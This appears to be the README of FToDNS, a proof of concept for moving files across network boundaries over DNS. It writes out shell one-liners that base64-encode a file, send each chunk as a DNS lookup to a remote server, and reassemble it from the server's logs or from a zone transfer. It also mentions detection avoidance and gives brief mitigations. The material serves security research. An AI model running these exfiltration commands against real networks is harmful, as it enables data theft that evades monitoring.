# FToDNS: File Transfer over Domain Name Service
Christopher Neitzert <chris@neitzert.com>

---

## What:
A Proof of Concept that utilizes the Domain Name Service protocol, loosely, as it was intended for data delivery and 
exfiltration across network boundaries with functionality on any standard Linux distribution with standard GNU Core utils and ISC's Bind9.


## Why:
This primarily is an intellectual exercise relating to practical information security in a networked environment.

The use of DNS for data exfiltration or VPN has been a hacker trope for the nearly four decades that DNS has existed.  
There have been several impliementations of this concept and this Proof of Concept is not unique. 
The recent introduction of [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) takes an already incendiary security issue and douses it with petroleum.

This PoC is meant to be seen as your drunken neighbor playing with fireworks far too close for comfort.


Although this implementation is not based on the previous PoCs, several interesting methods will be linked in the [Erratum.txt](https://github.com/neitzert/FToDNS/blob/master/Erratum.txt)

---

## How it works

Given the multitude of ways DNS can be integrated into an infrastructure and the limited number of actions we wish to test we will describe the PoC in three high level and generic terms; 
* Type: What type of server are they.
* Landscape:  What is it's configuraiton.
* Verbs:  What actions happen.


### Types
![TYPES of System](/images/FToDNS_Types.png)
* The three types of system operating within this PoC.
* Authoritative DNS Server:  A DNS server that behaves as though it is an authoritative resource of Domain Name information.
* Recursive DNS Server: A DNS server that is not an authoritative resource of Domain Name infomration, but retreives it for the DNS Client.
* DNS Client: The resolver that queries the Domain Name Service to resolve addresses.
 
### Landscape:
* Two types of Landscape that DNS servers exists in, 'Direct Client to Server' and 'Client to Recursive Server to Authoritative' (AKA: Recursive). 
From the perspective of bad actor in the PoC the a recursive landscape contains additional hops in the communication flow from client to server.


#### Direct Client to Server
![Generic DNS](/images/DNS_Generic.png)
* A typical DNS client queries a DNS server for a host or zone.
* It might traverse a firewall or two as it crosses the internet
* The DNS server responds to the DNS client with an answer or error


#### Client to Recursive Server to Authoritative Server
![Client to Recursive to SOA DNS](/images/DNS_Recursion.png)
* A typical DNS client queries a DNS server for a host or zone.
* Local rules might require the DNS client use a local server.
* The Local Server likely does not have the zone, so it queries the Authoritative Server on behalf of the DNS client.
* The query might traverse a firewall or two as it crosses the internet
* The Authoritative Server responds with an answer or error to the Local Server.
* The Local Server then relays that information to the DNS client.


### Verbs
* The two 'Verbs' that happen in a basic file transfer; We will call them 'Put File' and 'Get file'. 
* Where to put a file is to copy towards and to get a file is to copy from other systems.

#### Put File
![DNS](/images/FToDNS_PutFile.png)
* The user chooses a file and Base64 encodes the file with 56 Byte long lines
	* One consideration is a multiple encoding method to correct for out of order query-server-log issues.
		* ex: 
			* base64 -w56 $FILE | cat -n | base64 -w56 > file_to_be_put
	* Then for each 56 Byte long encoded line generated by encoded data the user simply performs a DNS lookup with that line to their DNS Server.
		* ex: 
			* host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1 
		* Detection avoidance considerations should be taken around timing, encoding, destination servers, and host call.
	* The query is not required to exist on the Authoritative DNS server to be logged at the Authoritative DNS server. 
		* ex: 
			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
	* Each query is logged by the destination DNS Server and easily extracted by the inverse method of it's encoding.
		* ex: 
			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
 



#### Get File
![DNS](/images/FToDNS_GetFile.png)
* The server operator chooses a file that they want to make available globally via DNS.
	* The file is base64 encoded and written into a DNS Zone file and served globally in DNS.
		* ex: 
			* See [ZoneMaker](https://github.com/neitzert/FToDNS/blob/master/ZoneMaker.sh) for details on this process.
	* The user who wishes to get the file then performs a zone transfer and extracts the file by the inverse method of it's encoding.
		* ex:  As shown in [ZoneGet] (https://github.com/neitzert/FToDNS/blob/master/ZoneGet.sh) 
			* host -t axfr $1 $2|grep $3 | sort -n| cut -f2 -d"-"| cut -f1 -d"."|/bin/base64 -d |/bin/base64 -d > $DESIRED_FILE_OUTPUT 


---


## Proof of Concept Criteria and Requirements

1. PoC Criteria
	1. Proof of concept must be limited to tools built into the OS plus Bind9 for DNS service.
	1. Some sort of TCP-IP network between client & server that permits DNS between Client and Server. 
	1. Proof of concept must be able to, via the DNS protocol, 
		1. Copy a file from a remote server to a local client across a network
		1. Copy a file on a local client to a remote server across a network

1. Client Requirements:
	1. Standard Linux Distribution with standard GNU Core utils
	1. Host(1) ISC's standard host utility.  
	1. Base64, grep, cut, sed, awk, general sh scripting

1. Server Requirements:
	1. Standard Linux Distribution with standard GNU Core utils
	1. ISC's Bind9 DNS server 
		1. Ability to write zone files
		1. Ability to read log files
		1. Ability to change named.conf to allow zone transfers.
		1. named.conf configuration changes TBD
	1. Base64, grep, cut, sed, awk, general sh scripting


1. Types of Test 
	1. Due to the complexity of the PoC, this will be broken down into multiple types of PoC
		1. - [x]Direct Client to Server
			1. - [x]Read file 
			1. - [x]Write file
		1. - [ ]Client to Recursive to Authoritative
			1. - [ ]Read file
			1. - [ ]Write file
		1. - [ ]Client via DoH to HTTPS/DNS server 
			1. - [ ]Read file
			1. - [ ]Write file


---

## Mitigation:

This specific Proof of Concept creates several issues with its issuance and this document would not be complete without a short discussion on mitigation.

1. Network
	1. Limit Talkers
	1. Record DNS 'meta data'
	1. 
	
1. DNS Server Architecture
	1. Restrict zone transfers 
	1. Disable recursive checks and retrievals.	
	
1. Fuzzing
	1. Timing and Frequency
	1. Query length
	1. Text Encoding
	1. 

---


## File Descriptions:

### Resolver.sh

A simple script to encode a file into a very large number of DNS host look up queries for later collection and reassembly on the upstream DNS server 


### ZoneGet.sh

Simple script to query a DNS server and decode the output of an entire DNS zone where each CNAME entry in the zone is a line fragment of a double base64 encoded file created by the script ZoneMaker.sh. 


### ZoneMaker.sh

Simple script to take a file and base64 encode it, write it into a DNS zone file for remote serving on a Bind9 DNS server.


---


 
## Disclaimers 
All standard disclaimers apply, no warranty, claims, or promises declared, made or implied.

For educational, research, and entertainment purposes only. 

Usability expires while you wait.

